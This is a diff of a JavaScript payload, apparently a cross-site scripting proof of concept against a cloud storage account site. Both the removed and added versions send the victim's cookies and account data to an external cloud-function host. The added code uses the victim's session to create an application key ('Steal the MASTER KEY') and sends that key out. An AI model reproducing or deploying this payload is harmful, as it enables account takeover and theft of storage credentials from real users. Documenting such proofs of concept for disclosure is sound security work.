@@ -1,34 +1,39 @@
 (function() {
   var SAVE_URL = "https://asia-southeast1-child-guard-prod.cloudfunctions.net/api/v1/poc/save";
 
-  // Step 1: Grab the CSRF token from the page
-  var token = "";
-  var tokenEl = document.getElementsByName("token");
-  if (tokenEl && tokenEl.length > 0) token = tokenEl[0].value;
-
+  // Read accountId and clusterNum from cookies
   var accountId = "";
+  var clusterNum = "";
   try {
-    var m = document.body.innerHTML.match(/"accountId"\s*:\s*"([^"]+)"/);
-    if (m) accountId = m[1];
+    var sso = decodeURIComponent(document.cookie.match(/bz_sso=([^;]+)/)[1]);
+    accountId = sso.match(/"accountId"\s*:\s*"([^"]+)"/)[1];
+    clusterNum = document.cookie.match(/bz_cluster_num=([^;]+)/)[1];
   } catch(e) {}
 
-  // Step 2: Fetch the Application Keys page to discover the API
-  fetch("/b2_keys.htm", { credentials: "same-origin" })
-    .then(function(r) { return r.text(); })
-    .then(function(keysPage) {
-      // Step 3: Send everything back to our server
-      fetch(SAVE_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          type: "PRIV_ESC_RECON",
-          csrfToken: token,
-          accountId: accountId,
-          cookies: document.cookie,
-          keysPageHTML: keysPage,
-          url: location.href,
-          timestamp: new Date().toISOString()
-        })
-      });
+  // Steal the MASTER KEY
+  fetch("/account_tangle/create_b2_application_key", {
+    method: "POST",
+    credentials: "same-origin",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      accountId: accountId,
+      clusterNum: clusterNum
+    })
+  })
+  .then(function(r) { return r.json(); })
+  .then(function(resp) {
+    // Send master key to our server
+    fetch(SAVE_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        type: "MASTER_KEY_STOLEN",
+        accountId: accountId,
+        masterKey: resp.b2ApplicationKey,
+        fullResponse: resp,
+        cookies: document.cookie,
+        timestamp: new Date().toISOString()
+      })
     });
+  });
 })();
